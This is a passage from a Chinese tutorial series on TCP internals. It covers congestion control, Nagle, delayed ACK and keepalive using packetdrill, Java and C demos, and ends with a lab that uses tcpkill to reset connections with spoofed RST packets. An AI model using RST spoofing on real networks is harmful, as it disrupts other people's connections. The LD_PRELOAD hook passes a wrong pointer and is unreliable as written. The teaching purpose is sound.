+0 setsockopt(3, SOL_SOCKET, SO_REUSEADDR, [1], 4) = 0  4 +0 bind(3, ..., ...) = 0  5 +0 listen(3, 1) = 0  6  7 +0 \u0026lt; S 0:0(0) win 32792 \u0026lt;mss 1000,sackOK,nop,nop,nop,wscale 7\u0026gt;  8 +0 \u0026gt; S. 0:0(0) ack 1 \u0026lt;...\u0026gt;  9 +.1 \u0026lt; . 1:1(0) ack 1 win 257  10  11 +0 accept(3, ... , ...) = 4  12 // 往客户端写 5000 字节数据  13 +0.1 write(4, ..., 5000) = 5000  14  15 +.1 \u0026lt; . 1:1(0) ack 1001 win 257 \u0026lt;sack 1:1001,nop,nop\u0026gt;  // 三次重复 ack  16 +0 \u0026lt; . 1:1(0) ack 1001 win 257 \u0026lt;sack 1:1001 2001:3001,nop,nop\u0026gt;  17 +0 \u0026lt; . 1:1(0) ack 1001 win 257 \u0026lt;sack 1:1001 2001:4001,nop,nop\u0026gt;  18 +0 \u0026lt; . 1:1(0) ack 1001 win 257 \u0026lt;sack 1:1001 2001:5001,nop,nop\u0026gt;  19 // 回复确认包，让服务端不再重试  20 +.1 \u0026lt; . 1:1(0) ack 5001 win 257  21  22 +0 `sleep 1000000`   用 tcpdump 抓包以供 wireshark 分析sudo tcpdump -i any port 8080 -nn -A -w fast_retran.pcap，使用 packetdrill 执行上面的脚本。 可以看到，完全符合我们的预期，3 次重复 ACK 以后，过了15微妙，立刻进行了重传\n打开单个包的详情，在 ACK 包的 option 选项里，包含了 SACK 的信息，如下图： 算法四：快速恢复 当收到三次重复 ACK 时，进入快速恢复阶段。解释为网络轻度拥塞。\n 拥塞阈值 ssthresh 降低为 cwnd 的一半：ssthresh = cwnd / 2 拥塞窗口 cwnd 设置为 ssthresh 拥塞窗口线性增加  慢启动、快速恢复中的快慢是什么意思 刚开始学习这部内容的时候，有一个疑惑，明明慢启动拥塞窗口是成指数级增长，那还叫慢？快速恢复拥塞窗口增长的这么慢，还叫快速恢复？\n我的理解是慢和快不是指的拥塞窗口增长的速度，而是指它们的初始值。慢启动初始值一般都很小，快速恢复的 cwnd 设置为 ssthresh\n演示丢包 下面我们来演示出现丢包重传时候，拥塞窗口变化情况\n1 2 3 4 5 6 7 8 9 10 11  // 回复这 10 段数据 +.2 \u0026lt; . 1:1(0) ack 1001 win 65535  // 预期会发出 20 段 MSS +0 \u0026gt; . 1001:1101(100) ack 1 \u0026lt;...\u0026gt; // ... 省略若干行 +0 \u0026gt; . 2901:3001(100) ack 1 \u0026lt;...\u0026gt;   // 过 3 秒再回复这 20 段数据，模拟网络延迟，发送端会在这期间重传 +3 \u0026lt; . 1:1(0) ack 3001 win 65535   这种情况下，我们来抓包看一下\n本来应该发送 40 段数据的，实际上只发送了 20 段，因为 TCP 这个时候已经知道网络可能已经出现拥塞，如果发送更大量的数据，会加重拥塞。\n拥塞避免把丢包当做网络拥塞的标志，如果出现了丢包的情况，必须调整窗口的大小，避免更多的包丢失。\n拥塞避免是一个很复杂的话题，有很多种算法：TCP Reno、TCP new Reno、TCP Vegas、TCP CUBIC等，这里不做太多的展开。\n为什么初始化拥塞窗口 initcwnd 是 10 最初的 TCP 初始拥塞窗口值为 3 或者 4，大于 4KB 左右，如今常见的 web 服务数据流都较短，比如一个页面只有 4k ~ 6k，在慢启动阶段，还没达到传输峰值，整个数据流就可能已经结束了。对于大文件传输，慢启动没有什么问题，慢启动造成的时延会被均摊到漫长的传输过程中。\n根据 Google 的研究，90% 的 HTTP 请求数据都在 16KB 以内，约为 10 个 TCP 段。再大比如 16，在某些地区会出现明显的丢包，因此 10 是一个比较合理的值。\n小结 这篇文章主要以实际的案例讲解了拥塞控制的几种算法：\n 慢启动：拥塞窗口一开始是一个很小的值，然后每 RTT 时间翻倍 拥塞避免：当拥塞窗口达到拥塞阈值（ssthresh）时，拥塞窗口从指数增长变为线性增长 快速重传：发送端接收到 3 个重复 ACK 时立即进行重传 快速恢复：当收到三次重复 ACK 时，进入快速恢复阶段，此时拥塞阈值降为之前的一半，然后进入线性增长阶段  做一道练习题 设 TCP 的 ssthresh （慢开始门限）的初始值为 8 （单位为报文段）。当拥塞窗口上升到 12 时网络发生了超时，TCP 使用慢开始和拥塞避免。试分别求出第 1 次到第 15 次传输的各拥塞窗口大小，备注：拥塞算法使用 tahoe，初始窗口为 1。\n26、TCP 发包的 hold 住哥 —— Nagle 算法那些事 从这篇文章开始，我们来讲大名鼎鼎的 Nagle 算法。同样以一个小测验来开始。\n关于下面这段代码\n1 2 3 4 5 6 7  Socket socket = new Socket(); socket.connect(new InetSocketAddress(\u0026#34;localhost\u0026#34;, 9999)); OutputStream output = socket.getOutputStream(); byte[] request = new byte[10]; for (int i = 0; i \u0026lt; 5; i++) { output.write(request); }   说法正确的是：\n A. TCP 把 5 个包合并，一次发送 50 个字节 B. TCP 分 5 次发送，一次发送 10 个字节 C. 以上都不对  来做一下实验，客户端代码如下\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  public class NagleClient {  public static void main(String[] args) throws Exception {  Socket socket = new Socket(); SocketAddress address = new InetSocketAddress(\u0026#34;c1\u0026#34;, 9999); socket.connect(address); OutputStream output = socket.getOutputStream(); byte[] request = new byte[10]; // 分 5 次发送 5 个小包 for (int i = 0; i \u0026lt; 5; i++) { output.write(request); } TimeUnit.SECONDS.sleep(1); socket.close(); } }   服务端代码比较简单，可以直接用 nc -l 9999 启动一个 tcp 服务器 运行上面的 NagleClient，抓包如下\n可以看到除了第一个包是单独发送，后面的四个包合并到了一起，所以文章开头的答案是 C\n那为什么是这样的呢？这就是我们今天要讲的重点 Nagle 算法。\nnagle 算法 简单来讲 nagle 算法讲的是减少发送端频繁的发送小包给对方。\nNagle 算法要求，当一个 TCP 连接中有在传数据（已经发出但还未确认的数据）时，小于 MSS 的报文段就不能被发送，直到所有的在传数据都收到了 ACK。同时收到 ACK 后，TCP 还不会马上就发送数据，会收集小包合并一起发送。网上有人想象的把 Nagle 算法说成是「hold 住哥」，我觉得特别形象。\n算法思路如下：\n1 2 3 4 5 6 7 8 9 10 11  if there is new data to send  if the window size \u0026gt;= MSS and available data is \u0026gt;= MSS  send complete MSS segment now  else  if there is unconfirmed data still in the pipe  enqueue data in the buffer until an acknowledge is received  else  send data immediately  end if  end if end if   默认情况下 Nagle 算法都是启用的，Java 可以通过 setTcpNoDelay(true);来禁用 Nagle 算法。\n还是上面的代码，修改代码开启 TCP_NODELAY 禁用 Nagle 算法\n1 2 3 4  省略... Socket socket = new Socket(); socket.setTcpNoDelay(true); 省略...   再次抓包\n可以看到几乎同一瞬间分 5 次把数据发送了出去，不管之前发出去的包有没有收到 ACK。 Nagle 算法开启前后对比如下图所示\n用 packetdrill 来演示 Nagle 算法 如果不想写那么长的 Java 代码，可以用 packetdrill 代码来演示。同样的做法是发送端短时间内发送 5 个小包。先来看 Nagle 算法开启的情况\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24   1 --tolerance_usecs=100000  2 0.000 socket(..., SOCK_STREAM, IPPROTO_TCP) = 3  3 // 0.010 setsockopt(3, SOL_TCP, TCP_NODELAY, [1], 4) = 0  4  5 0.100...0.200 connect(3, ..., ...) = 0  6  7 // Establish a connection.  8 0.100 \u0026gt; S 0:0(0) \u0026lt;mss 1460,sackOK,TS val 100 ecr 0,nop,wscale 7\u0026gt;  9 0.200 \u0026lt; S. 0:0(0) ack 1 win 32792 \u0026lt;mss 1100,nop,wscale 7\u0026gt;  10 0.200 \u0026gt; . 1:1(0) ack 1  11  12 +0 write(3, ..., 10) = 10  13 +0 write(3, ..., 10) = 10  14 +0 write(3, ..., 10) = 10  15 +0 write(3, ..., 10) = 10  16 +0 write(3, ..., 10) = 10  17  18 +0.030 \u0026lt; . 1:1(0) ack 11 win 257  19 +0.030 \u0026lt; . 1:1(0) ack 21 win 257  20 +0.030 \u0026lt; . 1:1(0) ack 31 win 257  21 +0.030 \u0026lt; . 1:1(0) ack 41 win 257  22 +0.030 \u0026lt; . 1:1(0) ack 51 win 257  23  24 +0 `sleep 1000000`   先注释掉第三行，关闭 TCP_NODELAY，用 packetdrill 执行脚本sudo packetdrill nagle.pkt抓包结果如下\n结果如我们预期，第一个包正常发送，等第 1 次包收到 ACK 回复以后，后面的 4 次包合并在一起发送出去。\n现在去掉第三行的注释，禁用 Nagle 算法，重新运行抓包\n可以看到这次发送端没有等对端回复 ACK，就把所有的小包一个个发出去了。\n一个典型的小包场景：SSH 一个典型的大量小包传输的场景是用 ssh 登录另外一台服务器，每输入一个字符，服务端也随即进行回应，客户端收到了以后才会把输入的字符和响应的内容显示在自己这边。比如登录服务器后输入ls然后换行，中间包交互的过程如下图\n 客户端输入l，字符 l 被加密后传输给服务器 服务器收到l包，回复被加密的 l 及 ACK 客户端输入s，字符 s 被加密后传输给服务器 服务器收到s包，回复被加密的 s 及 ACK 客户端输入 enter 换行符，换行符被加密后传输给服务器 服务器收到换行符，回复被加密的换行符及 ACK 服务端返回执行 ls 的结果 客户端回复 ACK  Nagle 算法的意义在哪里 Nagle 算法的作用是减少小包在客户端和服务端直接传输，一个包的 TCP 头和 IP 头加起来至少都有 40 个字节，如果携带的数据比较小的话，那就非常浪费了。就好比开着一辆大货车运一箱苹果一样。\nNagle 算法在通信时延较低的场景下意义不大。在 Nagle 算法中 ACK 返回越快，下次数据传输就越早。\n假设 RTT 为 10ms 且没有延迟确认（这个后面会讲到），那么你敲击键盘的间隔大于 10ms 的话就不会触发 Nagle 的条件：只有接收到所有的在传数据的 ACK 后才能继续发数据，也即如果所有的发出去的包 ACK 都收到了，就不用等了。如果你想触发 Nagle 的停等（stop-wait）机制，1s 内要输入超过 100 个字符。因此如果在局域网内，Nagle 算法基本上没有什么效果。\n如果客户端到服务器的 RTT 较大，比如多达 200ms，这个时候你只要1s 内输入超过 5 个字符，就有可能触发 Nagle 算法了。\nNagle 算法是时代的产物：Nagle 算法出现的时候网络带宽都很小，当有大量小包传输时，很容易将带宽占满，出现丢包重传等现象。因此对 ssh 这种交互式的应用场景，选择开启 Nagle 算法可以使得不再那么频繁的发送小包，而是合并到一起，代价是稍微有一些延迟。现在的 ssh 客户端已经默认关闭了 Nagle 算法。\n小结 这篇文章主要介绍了非常经典的 Nagle 算法，这个算法可以有效的减少网络上小包的数量。Nagle 算法是应用在发送端的，简而言之就是，对发送端而言：\n 当第一次发送数据时不用等待，就算是 1byte 的小包也立即发送 后面发送数据时需要累积数据包直到满足下面的条件之一才会继续发送数据：  数据包达到最大段大小MSS 接收端收到之前数据包的确认 ACK    不过 Nagle 算法是时代的产物，可能会导致较多的性能问题，尤其是与我们下一篇文章要介绍的延迟确认一起使用的时候。很多组件为了高性能都默认禁用掉了这个特性。\n这篇文章我们来介绍延迟确认。\n首先必须明确两个观点：\n 不是每个数据包都对应一个 ACK 包，因为可以合并确认。 也不是接收端收到数据以后必须立刻马上回复确认包。  如果收到一个数据包以后暂时没有数据要分给对端，它可以等一段时间（Linux 上是 40ms）再确认。如果这段时间刚好有数据要传给对端，ACK 就可以随着数据一起发出去了。如果超过时间还没有数据要发送，也发送 ACK，以免对端以为丢包了。这种方式成为「延迟确认」。\n这个原因跟 Nagle 算法其实一样，回复一个空的 ACK 太浪费了。\n 如果接收端这个时候恰好有数据要回复客户端，那么 ACK 搭上顺风车一块发送。 如果期间又有客户端的数据传过来，那可以把多次 ACK 合并成一个立刻发送出去 如果一段时间没有顺风车，那么没办法，不能让接收端等太久，一个空包也得发。  这种机制被称为延迟确认（delayed ack），思破哥的文章把延迟确认（delayed-ack）称为「磨叽姐」，挺形象的。TCP 要求 ACK 延迟的时延必须小于500ms，一般操作系统实现都不会超过200ms。\n延迟确认在很多 linux 机器上是没有办法关闭的，\n那么这里涉及的就是一个非常根本的问题：「收到数据包以后什么时候该回复 ACK」\n27、TCP 回包的磨叽姐 —— 延迟确认那些事 什么时候需要回复 ACK tcp_input.c\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22  static void __tcp_ack_snd_check(struct sock *sk, int ofo_possible) { \tstruct tcp_sock *tp = tcp_sk(sk);  \t/* More than one full frame received... */ \tif (((tp-\u0026gt;rcv_nxt - tp-\u0026gt;rcv_wup) \u0026gt; tp-\u0026gt;ack.rcv_mss \t/* ... and right edge of window advances far enough. \t* (tcp_recvmsg() will send ACK otherwise). Or... \t*/ \t\u0026amp;\u0026amp; __tcp_select_window(sk) \u0026gt;= tp-\u0026gt;rcv_wnd) || \t/* We ACK each frame or... */ \ttcp_in_quickack_mode(tp) || \t/* We have out of order data. */ \t(ofo_possible \u0026amp;\u0026amp; \tskb_peek(\u0026amp;tp-\u0026gt;out_of_order_queue))) { \t/* Then ack it now */ \ttcp_send_ack(sk); \t} else { \t/* Else, send delayed ack. */ \ttcp_send_delayed_ack(sk); \t} }   可以看到需要立马回复 ACK 的场景有：\n 如果接收到了大于一个frame 的报文，且需要调整窗口大小 处于 quickack 模式（tcp_in_quickack_mode） 收到乱序包（We have out of order data.）  其它情况一律使用延迟确认的方式\n需要重点关注的是：tcp_in_quickack_mode()\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21  /* Send ACKs quickly, if \u0026#34;quick\u0026#34; count is not exhausted * and the session is not interactive. */  static __inline__ int tcp_in_quickack_mode(struct tcp_sock *tp) { \treturn (tp-\u0026gt;ack.quick \u0026amp;\u0026amp; !tp-\u0026gt;ack.pingpong); }  /* Delayed ACK control data */ struct { \t__u8\tpending;\t/* ACK is pending */ \t__u8\tquick;\t/* Scheduled number of quick acks\t*/ \t__u8\tpingpong;\t/* The session is interactive\t*/ \t__u8\tblocked;\t/* Delayed ACK was blocked by socket lock*/ \t__u32\tato;\t/* Predicted tick of soft clock\t*/ \tunsigned long timeout;\t/* Currently scheduled timeout\t*/ \t__u32\tlrcvtime;\t/* timestamp of last received data packet*/ \t__u16\tlast_seg_size;\t/* Size of last incoming segment\t*/ \t__u16\trcv_mss;\t/* MSS used for delayed ACK decisions\t*/ } ack;   内核 tcp_sock 结构体中有一个 ack 子结构体，内部有一个 quick 和 pingpong 两个字段，其中pingpong 就是判断交互连接的，只有处于非交互 TCP 连接才有可能即进入 quickack 模式。\n什么是交互式和 pingpong 呢？\n顾名思义，其实有来有回的双向数据传输就叫 pingpong，对于通信的某一端来说，R-W-R-W-R-W...（R 表示读，W 表示写）\n延迟确认出现的最多的场景是 W-W-R（写写读），我们来分析一下这种场景。\n延迟确认实际例子演示 可以用一段 java 代码演示延迟确认。\n服务端代码如下，当从服务端 readLine 有返回非空字符串（读到\\n 或 \\r）就把字符串原样返回给客户端\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22  public class DelayAckServer {  private static final int PORT = 8888;   public static void main(String[] args) throws IOException {  ServerSocket serverSocket = new ServerSocket(); serverSocket.bind(new InetSocketAddress(PORT)); System.out.println(\u0026#34;Server startup at \u0026#34; + PORT); while (true) { Socket socket = serverSocket.accept(); InputStream inputStream = socket.getInputStream(); OutputStream outputStream = socket.getOutputStream(); int i = 1; while (true) { BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream)); String line = reader.readLine(); if (line == null) break; System.out.println((i++) + \u0026#34; : \u0026#34; + line); outputStream.write((line + \u0026#34;\\n\u0026#34;).getBytes()); } } } }   下面是客户端代码，客户端分两次调用 write 方法，模拟 http 请求的 header 和 body。第二次 write 包含了换行符（\\n)，然后测量 write、write、read 所花费的时间。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22  public class DelayAckClient {  public static void main(String[] args) throws IOException {  Socket socket = new Socket(); socket.connect(new InetSocketAddress(\u0026#34;server_ip\u0026#34;, 8888)); InputStream inputStream = socket.getInputStream(); OutputStream outputStream = socket.getOutputStream(); BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream)); String head = \u0026#34;hello, \u0026#34;; String body = \u0026#34;world\\n\u0026#34;;   for (int i = 0; i \u0026lt; 10; i++) { long start = System.currentTimeMillis(); outputStream.write((\u0026#34;#\u0026#34; + i + \u0026#34; \u0026#34; + head).getBytes()); // write outputStream.write((body).getBytes()); // write String line = reader.readLine(); // read System.out.println(\u0026#34;RTT: \u0026#34; + (System.currentTimeMillis() - start) + \u0026#34;: \u0026#34; + line); } inputStream.close(); outputStream.close(); socket.close(); } }   运行结果如下\n1 2 3 4 5 6 7 8 9 10 11  javac DelayAckClient.java; java -cp . DelayAckClient RTT: 1: #0 hello, world RTT: 44: #1 hello, world RTT: 46: #2 hello, world RTT: 44: #3 hello, world RTT: 42: #4 hello, world RTT: 41: #5 hello, world RTT: 41: #6 hello, world RTT: 44: #7 hello, world RTT: 44: #8 hello, world RTT: 44: #9 hello, world   除了第一次，剩下的 RTT 全为 40 多毫秒。这刚好是 Linux 延迟确认定时器的时间 40ms 抓包结果如下:\n对包逐个分析一下 1 ~ 3：三次握手 4 ~ 9：第一次 for 循环的请求，也就是 W-W-R 的过程\n 4：客户端发送 \u0026ldquo;#0 hello, \u0026quot; 给服务端 5：因为服务端只收到了数据还没有回复过数据，tcp 判断不是 pingpong 的交互式数据，属于 quickack 模式，立刻回复 ACK 6：客户端发送 \u0026ldquo;world\\n\u0026rdquo; 给服务端 7：服务端因为还没有回复过数据，tcp 判断不是 pingpong 的交互式数据，服务端立刻回复 ACK 8：服务端读到换行符，readline 函数返回，会把读到的字符串原样写入到客户端。TCP 这个时候检测到是 pingpong 的交互式连接，进入延迟确认模式 9：客户端收到数据以后回复 ACK  10 ~ 14：第二次 for 循环\n 10：客户端发送 \u0026ldquo;#1 hello, \u0026quot; 给服务端。服务端收到数据包以后，因为处于 pingpong 模式，开启一个 40ms 的定时器，奢望在 40ms 内有数据回传 11：很不幸，服务端等了 40ms 定期器到期都没有数据回传，回复确认 ACK 同时取消 pingpong 状态 12：客户端发送 \u0026ldquo;world\\n\u0026rdquo; 给服务端 13：因为服务端不处于 pingpong 状态，所以收到数据立即回复 ACK 14：服务端读到换行符，readline 函数返回，会把读到的字符串原样写入到客户端。这个时候又检测到收发数据了，进入 pingpong 状态。  从第二次 for 开始，后面的数据包都一样了。 整个过程包交互图如下：\n用 packetdrill 模拟延迟确认 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31  --tolerance_usecs=100000 0.000 socket(..., SOCK_STREAM, IPPROTO_TCP) = 3 0.000 setsockopt(3, SOL_SOCKET, SO_REUSEADDR, [1], 4) = 0 0.000 bind(3, ..., ...) = 0 0.000 listen(3, 1) = 0  0.000 \u0026lt; S 0:0(0) win 32792 \u0026lt;mss 1000, sackOK, nop, nop, nop, wscale 7\u0026gt; 0.000 \u0026gt; S. 0:0(0) ack 1 \u0026lt;...\u0026gt;  0.000 \u0026lt; . 1:1(0) ack 1 win 257  0.000 accept(3, ..., ...) = 4  + 0 setsockopt(4, SOL_TCP, TCP_NODELAY, [1], 4) = 0  // 模拟往服务端写入 HTTP 头部: POST / HTTP/1.1 +0 \u0026lt; P. 1:11(10) ack 1 win 257  // 模拟往服务端写入 HTTP 请求 body: {\u0026#34;id\u0026#34;: 1314} +0 \u0026lt; P. 11:26(15) ack 1 win 257  // 往 fd 为4 的 模拟服务器返回 HTTP response {} + 0 write(4, ..., 100) = 100   // 第二次模拟往服务端写入 HTTP 头部: POST / HTTP/1.1 +0 \u0026lt; P. 26:36(10) ack 101 win 257  // 抓包看服务器返回  +0 `sleep 1000000`   这个构造包的过程跟前面的思路是一模一样的，抓包同样复现了 40ms 延迟的现象。\n可以设置关掉延迟确认吗？ 这个是我刚开始学习 TCP 的一个疑惑，既然是 TCP 的一个特性，那有没有一个开关可以开启或者关闭延迟确认呢？ 答案是否定的，大部分 Linux 实现上并没有开关可以关闭延迟确认。我曾经以为它是一个 sysctl 项，可是后来找了很久都没有找到，没有办法通过一个配置彻底关掉或者开启 Linux 的延迟确认。\n当 Nagle 算法遇到延迟确认 Nagle 算法和延迟确认本身并没有什么问题，但一起使用就会出现很严重的性能问题了。Nagle 攒着包一次发一个，延迟确认收到包不马上回。\n如果我们把上面的 Java 代码稍作调整，禁用 Nagle 算法可以试一下。\n1 2 3  Socket socket = new Socket(); socket.setTcpNoDelay(true); // 禁用 Nagle 算法 socket.connect(new InetSocketAddress(\u0026#34;server ip\u0026#34;, 8888));   运行 Client 端，可以看到 RTT 几乎为 0\n1 2 3 4 5 6 7 8 9 10  RTT: 1: #0 hello, world RTT: 0: #1 hello, world RTT: 1: #2 hello, world RTT: 1: #3 hello, world RTT: 0: #4 hello, world RTT: 1: #5 hello, world RTT: 1: #6 hello, world RTT: 0: #7 hello, world RTT: 1: #8 hello, world RTT: 0: #9 hello, world   抓包结果如下\n黑色背景部分的是客户端发送给服务端的请求包，可以看到在禁用 Nagle 的情况下，不用等一个包发完再发下一个，而是几乎同时把两次写请求发送出来了。服务端收到带换行符的包以后，立马可以返回结果，ACK 可以捎带过去，就不会出现延迟 40ms 的情况。\n小结 这篇文章主要介绍了延迟确认出现的背景和原因，然后用一个实际的代码演示了延迟确认的具体的细节。到这里 Nagle 算法和延迟确认这两个主题就介绍完毕了。\n28、兄弟你还活着吗 —— keepalive 原理 一个 TCP 连接上，如果通信双方都不向对方发送数据，那么 TCP 连接就不会有任何数据交换。这就是我们今天要讲的 TCP keepalive 机制的由来。\n永远记住 TCP 不是轮询的协议 网络故障或者系统宕机都将使得对端无法得知这个消息。如果应用程序不发送数据，可能永远无法得知该连接已经失效。假设应用程序是一个 web 服务器，客户端发出三次握手以后故障宕机或被踢掉网线，对于 web 服务器而已，下一个数据包将永远无法到来，但是它一无所知。TCP 不会采用类似于轮询的方式来询问：小老弟你有什么东西要发给我吗？\n这种情况下服务端会永远处于 ESTABLISHED 吗？\nTCP 的 half open 上面所说的情况就是典型的 TCP「半打开 half open」\n 这一个情况就是如果在未告知另一端的情况下通信的一端关闭或终止连接，那么就认为该条TCP连接处于半打开状态。 这种情况发现在通信的一方的主机崩溃、电源断掉的情况下。 只要不尝试通过半开连接来传输数据，正常工作的一端将不会检测出另外一端已经崩溃。\n 模拟客户端网络故障 准备两台虚拟机 c1（服务器），c2（客户端）。在 c1 上执行 nc -l 8080 启动一个 TCP 服务器监听 8080 端口，同时在服务器 c1 上执行 tcpdump 查看包发送的情况。 在 c2 上用 nc c1 8080创建一条 TCP 连接 在 c1 上执行 netstat 查看连接状态，可以看到服务端已处于 ESTABLISHED 状态\n1 2  sudo netstat -lnpa | grep -i 8080 tcp 0 0 10.211.55.5:8080 10.211.55.10:60492 ESTABLISHED 2787/nc   这时断掉 c1 的网络连接，可以看到 tcpdump 抓包没有任何包交互。此时再用 netstat 查看，发现连接还是处于 ESTABLISHED 状态。\n过了几个小时以后再来查看，依旧是 ESTABLISHED 状态，且 tcpdump 输出显示没有任何包传输。\nTCP 的 keepalive TCP 协议的设计者考虑到了这种检测长时间死连接的需求，于是乎设计了 keepalive 机制。 在我的 CentOS 机器上，keepalive 探测包发送数据 7200s，探测 9 次，每次探测间隔 75s，这些值都有对应的参数可以配置。\n为了能更快的演示，修改 centos 机器上 keepalive 相关的参数如下\n1 2 3 4 5 6  // 30s没有数据包交互发送 keepalive 探测包 echo 30 \u0026gt; /proc/sys/net/ipv4/tcp_keepalive_time // 每次探测TCP 包间隔 echo 10 \u0026gt; /proc/sys/net/ipv4/tcp_keepalive_intvl // 探测多少次 echo 5 \u0026gt; /proc/sys/net/ipv4/tcp_keepalive_probes   默认情况下 nc 是没有开启 keepalive 的，怎么样在不修改 nc 源码的情况下，让它拥有 keepalive 的功能呢？\n正常情况下，我们设置 tcp 的 keepalive 选项的代码如下：\n1 2  int flags = 1; setsockopt(socket_fd, SOL_TCP, TCP_KEEPALIVE, (void *)\u0026amp;flags, sizeof(flags)   我们可以用 strace 看下 nc -l 8080背后的系统调用\n1 2 3 4  socket(AF_INET, SOCK_STREAM, IPPROTO_TCP) = 4 setsockopt(4, SOL_SOCKET, SO_REUSEADDR, [1], 4) = 0 bind(4, {sa_family=AF_INET, sin_port=htons(8080), sin_addr=inet_addr(\u0026#34;0.0.0.0\u0026#34;)}, 128) = 0 listen(4, 10)   可以看到 nc 只调用 setsockopt 设置了 SO_REUSEADDR 允许端口复用，并没有设置 TCP_KEEPALIVE，那我们 hook 一下 setsockopt 函数调用，让它在设置端口复用的同时设置 TCP_KEEPALIVE。那怎么样来做 hook 呢？\n偷梁换柱之 LD_PRELOAD LD_PRELOAD 是一个 Linux 的环境变量，运行在程序运行前优先加载动态链接库，类似于 Java 的字节码改写 instrument。通过这个环境变量，我们可以修改覆盖真正的系统调用，达到我们的目的。 这个过程如下：\n新建文件 setkeepalive.c，全部代码如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26  #include \u0026lt;sys/socket.h\u0026gt;#include \u0026lt;stdio.h\u0026gt;#include \u0026lt;dlfcn.h\u0026gt;#include \u0026lt;string.h\u0026gt; static int (*real_setsockopt)(int , int , int , void *, socklen_t) = NULL;  __attribute__((constructor)) void init() {  real_setsockopt = dlsym(RTLD_NEXT, \u0026#34;setsockopt\u0026#34;); }  int setsockopt(int sockfd, int level, int optname,  const void *optval, socklen_t optlen) {  printf(\u0026#34;SETSOCKOPT: %d: level: %d %d=%d (%d)\\r\\n\u0026#34;,  sockfd, level, optname, *(int*)optval, optlen);  // 调用原函数  real_setsockopt(sockfd, level, optname, \u0026amp;optval, optlen);  // 判断是否是 SO_REUSEADDR  if (level == SOL_SOCKET \u0026amp;\u0026amp; optname == SO_REUSEADDR) {  int val = 1;  // 设置 SO_KEEPALIVE  real_setsockopt(sockfd, SOL_SOCKET, SO_KEEPALIVE, \u0026amp;val, optlen);  return 0;  }  return 0; }   编译上面的 setkeepalive.c 文件为 .so 文件： gcc setkeepalive.c -fPIC -D_GNU_SOURCE -shared -ldl -o setkeepalive.so\n替换并测试运行\n1  LD_PRELOAD=./setkeepalive.so nc -l 8080   再来重复上面的测试流程，抓包如下：\n完美的展现了 keepalive 包的探测的过程: 1 ~ 3：三次握手，随后模拟客户端断网 4：30s 以后服务端发送第一个探测包（对应 tcp_keepalive_time） 5 ~ 8：因探测包一直没有回应，每隔 10s 发出剩下的 4 次探测包 9：5 次探测包以后，服务端觉得没有希望了，发出 RST 包，断掉这个连接\n为什么大部分应用程序都没有开启 keepalive 选项 现在大部分应用程序（比如我们刚用的 nc）都没有开启 keepalive 选项，一个很大的原因就是默认的超时时间太长了，从没有数据交互到最终判断连接失效，需要花 2.1875 小时（7200 + 75 * 9），显然太长了。但如果修改这个值到比较小，又违背了 keepalive 的设计初衷（为了检查长时间死连接）\n对我们的启示 在应用层做连接的有效性检测是一个比较好的实践，也就是我们常说的心跳包。\n小结 这篇文章我们介绍了 TCP keepalive 机制的由来，通过定时发送探测包来探测连接的对端是否存活，不过默认情况下需要 7200s 没有数据包交互才会发送 keepalive 探测包，往往这个时间太久了，我们熟知的很多组件都没有开启 keepalive 特性，而是选择在应用层做心跳机制。\n思考题 TCP 的 keepalive 与 HTTP 的 keep-alive 有什么区别？\n29、TCP RST 攻击与如何杀掉一条 TCP 连接 这篇文章我们来介绍 TCP RST 攻击以及如何在不干预通信双方进程的情况下杀掉一条 TCP 连接。\nRST 攻击 RST 攻击也称为伪造 TCP 重置报文攻击，通过伪造 RST 报文来关闭掉一个正常的连接。\n源 IP 地址伪造非常容易，不容易被伪造的是序列号，RST 攻击最重要的一点就是构造的包的序列号要落在对方的滑动窗口内，否则这个 RST 包会被忽略掉，达不到攻击的效果。\n下面我们用实验演示不在滑动窗口内的 RST 包会被忽略的情况，完整的代码见：rst_out_of_window.pkt\n1 2 3 4 5 6 7 8 9 10 11 12 13  +0 \u0026lt; S 0:0(0) win 32792 \u0026lt;mss 1460\u0026gt; +0 \u0026gt; S. 0:0(0) ack 1 \u0026lt;...\u0026gt; +.1 \u0026lt; . 1:1(0) ack 1 win 65535 +0 accept(3, ..., ...) = 4  // 不在窗口内的 RST +.010 \u0026lt; R. 29202:29202(0) ack 1 win 65535  // 如果上面的 RST 包落在窗口内，连接会被重置，下面的写入不会成功 +.010 write(4, ..., 1000) = 1000  // 断言服务端会发出下面的数据包 +0 \u0026gt; P. 1:1001(1000) ack 1 \u0026lt;...\u0026gt;   执行上面的脚本，抓包的结果如下，完整的包见：rst_out_of_window.pcap\n抓包文件中的第 5 个包可以看到，write 调用成功，1000 字节发送成功，write 调用并没有收到 RST 包的影响。\n下面来介绍两个工具，利用 RST 攻击的方式来杀掉一条连接。\n工具一：tcpkill 工具使用及原理介绍 Centos 下安装 tcpkill 命令步骤如下\n1 2  yum install epel-release -y yum install dsniff -y   实验步骤： 1、机器 c2(10.211.55.10) 启动 nc 命令监听 8080 端口，充当服务器端，记为 B\n1  nc -l 8080   2、机器 c2 启动 tcpdump 抓包\n1  sudo tcpdump -i any port 8080 -nn -U -vvv -w test.pcap   3、本地机器终端（10.211.55.2，记为 A）使用 nc 与 B 的 8080 端口建立 TCP 连接\n1  nc c2 8080   在服务端 B 机器上可以看到这条 TCP 连接\n1 2  netstat -nat | grep -i 8080 tcp 0 0 10.211.55.10:8080 10.211.55.2:60086 ESTABLISHED   4、启动 tcpkill\n1  sudo tcpkill -i eth0 port 8080   注意这个时候 tcp 连接依旧安然无恙，并没有被杀掉。\n5、在本地机器终端 nc 命令行中随便输入一点什么，这里输入hello，发现这时服务端和客户端的 nc 进程已经退出了\n下面来分析抓包文件，这个文件可以从我的 github 下载 tcpkill.pcap\n可以看到，tcpkill 假冒了 A 和 B 的 IP发送了 RST 包给通信的双方，那问题来了，伪造 ip 很简单，它是怎么知道当前会话的序列号的呢？\ntcpkill 的原理跟 